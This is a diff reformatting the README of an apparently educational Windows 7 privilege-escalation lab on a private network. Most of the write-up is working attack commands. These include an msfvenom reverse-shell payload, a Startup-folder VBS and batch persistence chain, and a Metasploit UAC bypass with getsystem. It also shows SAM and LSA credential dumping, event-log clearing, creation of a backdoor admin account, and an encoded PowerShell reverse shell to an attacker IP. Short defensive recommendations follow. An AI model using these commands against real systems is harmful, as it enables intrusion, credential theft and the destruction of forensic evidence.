@@ -59,43 +59,59 @@ nmap -p- 192.168.31.15
 
 User & Share Enumeration via Impacket:
 
-Bash
+```Bash
 impacket-samrdump BITCH@192.168.31.15
 impacket-smbclient BITCH@192.168.31.15
+```
 DOS
+
+---
+```cmd
 # shares
 # use Users
 # cd BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
 💡 Key Discovery: Write permissions within the user's Startup directory were confirmed. This finding created a potential persistence vector whereby files placed within the startup path could automatically execute when the user logged in.
 
-⚔️ Phase 2: Persistence Framework Engineering
+---
+## ⚔️ Phase 2: Persistence Framework Engineering
 MITRE ATT&CK Mapping: T1547.001: Registry Run Keys / Startup Folder, T1059.005: Visual Basic
 
 With a persistence location identified, a three-stage execution chain was developed. The objective was to automatically execute a hidden payload whenever a user authenticated to the system.
 
-🏗️ Persistence Architecture
-📜 launch.vbs: A hidden VBScript launcher placed in the Startup folder.
+- 🏗️ Persistence Architecture
+- 📜 launch.vbs: A hidden VBScript launcher placed in the Startup folder.
+- 📜 test.bat: A batch execution wrapper used to launch the payload.
+- 💣 payload.exe: A Meterpreter executable generated using msfvenom.
 
-📜 test.bat: A batch execution wrapper used to launch the payload.
-
-💣 payload.exe: A Meterpreter executable generated using msfvenom.
+---
 
 💻 Commands Used
 Generate Payload:
 
-Bash
+```Bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.31.54 LPORT=8888 -f exe > payload.exe
+```
+
+---
 VBS Launcher (launch.vbs):
 
+```bash
 VBScript
 Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "cmd.exe /c ""C:\Users\BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\test.bat""", 0, False
+```
 Batch Controller (test.bat):
 
+---
 DOS
+```bash
 @echo off
 "C:\Users\BITCH\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\payload.exe"
-⚔️ Phase 3: Callback Validation
+```
+
+---
+## ⚔️ Phase 3: Callback Validation
 MITRE ATT&CK Mapping: T1059.003: Windows Command Shell
 
 The persistence framework was tested to determine whether payload execution occurred successfully after user interaction. A listener was configured, and a successful callback session was established.
@@ -103,47 +119,56 @@ The persistence framework was tested to determine whether payload execution occu
 💻 Commands Used
 Create Listener:
 
-Bash
+```Bash
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 192.168.31.54
 set LPORT 8888
 exploit
+```
 Meterpreter Session Validation:
 
 Code snippet
+```
 meterpreter > getuid
+```
 Server username: BITCH-PC\BITCH
+```
 meterpreter > background
-🧩 Operational Challenges & Troubleshooting
+```
+
+---
+## 🧩 Operational Challenges & Troubleshooting
 One of the most valuable aspects of this assessment was overcoming multiple environmental and platform-specific obstacles.
 
-🚧 Challenge 1: Administrative Access Denied (System Error 5)
-
+> 🚧 Challenge 1: Administrative Access Denied (System Error 5)
+```
 Problem: Attempts to create local accounts failed.
 
 Root Cause: The session operated under a filtered UAC token lacking sufficient privileges.
-
-🚧 Challenge 2: Legacy OS Limitations
-
+```
+> 🚧 Challenge 2: Legacy OS Limitations
+```
 Problem: Modern escalation techniques (like fodhelper.exe) were unavailable.
 
 Resolution: A Windows 7-compatible token-duplication UAC bypass method was selected.
-
-🚧 Challenge 3: File Transfer & Pathing Issues
-
+```
+> 🚧 Challenge 3: File Transfer & Pathing Issues
+```
 Problem: Payload deployment initially failed due to working-directory mismatches.
 
 Resolution: Explicit paths were mapped out and verified via SMB.
-
-🚧 Challenge 4: Port Binding Conflicts
-
+```
+> 🚧 Challenge 4: Port Binding Conflicts
+```
 Problem: Metasploit handlers experienced socket conflicts.
 
 Resolution: Active listeners were shifted to alternative ports (e.g., 5555).
+```
 
-⚔️ Phase 4: Privilege Escalation Assessment
+---
+## ⚔️ Phase 4: Privilege Escalation Assessment
 MITRE ATT&CK Mapping: T1548.002: Bypass User Account Control, T1134.001: Token Impersonation/Theft
 
 Following successful persistence validation, a token-duplication UAC bypass technique was executed. The exploit leveraged trusted COM interfaces to obtain a high-integrity access token.
@@ -151,20 +176,27 @@ Following successful persistence validation, a token-duplication UAC bypass tech
 💻 Commands Used
 UAC Bypass Execution:
 
-Bash
+```Bash
 msfconsole
 use exploit/windows/local/bypassuac
 set session 1
 set LPORT 5555
 run
+```
 Obtaining High-Integrity SYSTEM Access:
 
 Code snippet
+```
 meterpreter > getsystem
+```
 ... got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+```
 meterpreter > getuid
+```
 Server username: NT AUTHORITY\SYSTEM
-⚔️ Phase 5: Post-Exploitation & Defensive Evasion
+
+---
+## ⚔️ Phase 5: Post-Exploitation & Defensive Evasion
 MITRE ATT&CK Mapping: T1055: Process Injection, T1003.002: Security Account Manager, T1070.001: Clear Windows Event Logs
 
 To simulate an advanced threat actor removing forensic artifacts and securing session stability, advanced post-exploitation techniques were executed.
@@ -173,28 +205,35 @@ To simulate an advanced threat actor removing forensic artifacts and securing se
 Process Migration (Evasion & Stability):
 
 Code snippet
+```bash
 meterpreter > ps
 meterpreter > migrate 2036
 [*] Migrating from 3456 to 2036...
 [*] Migration completed successfully.
+```
 (Injected into the user's explorer.exe process)
 
 Credential Extraction (Local SAM & Memory Secrets):
 
 Code snippet
+```bash
 meterpreter > hashdump
 meterpreter > load kiwi
 meterpreter > lsa_dump_sam
 meterpreter > lsa_dump_secrets
+```
 (Recovered NTLM hashes, LSA secrets, and DPAPI keys)
 
 Clearing Forensic Tracks:
 
 Code snippet
+```bash
 meterpreter > clearev
+```
 (Successfully wiped Application, System, and Security event logs)
 
-⚔️ Phase 6: Persistence Validation
+---
+## ⚔️ Phase 6: Persistence Validation
 MITRE ATT&CK Mapping: T1136.001: Local Account Create
 
 After achieving SYSTEM-level compromise, a dedicated administrative account was created and added to the Local Administrators group to validate alternative persistence mechanisms.
@@ -203,27 +242,36 @@ After achieving SYSTEM-level compromise, a dedicated administrative account was 
 Administrative Account Creation:
 
 Code snippet
+```bash
 meterpreter > shell
 C:\Windows\system32>net user ironman jarvis /add
 C:\Windows\system32>net localgroup administrators ironman /add
+```
 (Verification procedures confirmed successful insertion into the administrative security boundary)
 
-⚙️ Payload Engineering Analysis
+---
+## ⚙️ Payload Engineering Analysis
 MITRE ATT&CK Mapping: T1059.001: PowerShell
 
 During testing, two execution approaches were evaluated. Initial deployment using a plain-text batch execution string failed because the Windows command processor interpreted special characters before execution.
 
-💻 Direct Execution (Failed)
+---
+## 💻 Direct Execution (Failed)
 DOS
+```cmd
 powershell -NoProfile -ExecutionPolicy Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient..."
+```
 ⚠️ Result: Parsing failures and execution collisions.
 
-💻 Encoded Execution (Success)
+## 💻 Encoded Execution (Success)
 DOS
+```cmd
 powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADMAMQAuADUANAAiACwA...
+```
 ✅ Result: Eliminated parsing collisions, preserved command integrity, and increased execution reliability.
 
-🚨 Security Findings & Recommendations
+---
+## 🚨 Security Findings & Recommendations
 Root Causes Identified
 🔴 Legacy Operating System: Windows 7 architecture lacks modern memory and credential protections.
 
@@ -233,6 +281,7 @@ Root Causes Identified
 
 🟠 Unrestricted Log Tampering: SYSTEM accounts possessed the ability to destroy primary host-based telemetry.
 
+---
 Defensive Recommendations
 🔄 Modernize Legacy Systems: Migrate unsupported operating systems to Windows 10/11.
 
@@ -242,10 +291,12 @@ Defensive Recommendations
 
 📊 Centralize Telemetry: Implement SIEM log forwarding to ensure event logs are preserved if local copies are cleared.
 
-📂 Project Structure
+---
+## 📂 Project Structure
 To maintain a professional repository layout, the project files are organized as follows:
 
 Plaintext
+```
 Windows7-Privilege-Escalation-Lab/
 │
 ├── README.md
@@ -267,10 +318,14 @@ Windows7-Privilege-Escalation-Lab/
 │
 └── docs/
     └── report.pdf
-🏁 Conclusion
+```
+
+---
+## 🏁 Conclusion
 This assessment successfully demonstrated the progression from restricted user access to full SYSTEM-level control. By mapping the workflow through the lens of detection engineering, the lab provided practical exposure to post-exploitation techniques, legacy OS troubleshooting, privilege escalation concepts, and forensic artifact destruction.
 
-⚠️ Disclaimer
+---
+## ⚠️ Disclaimer
 This project was conducted exclusively within an isolated laboratory environment for educational, research, and defensive security training purposes. No production systems, third-party infrastructure, or unauthorized targets were involved.
 
 
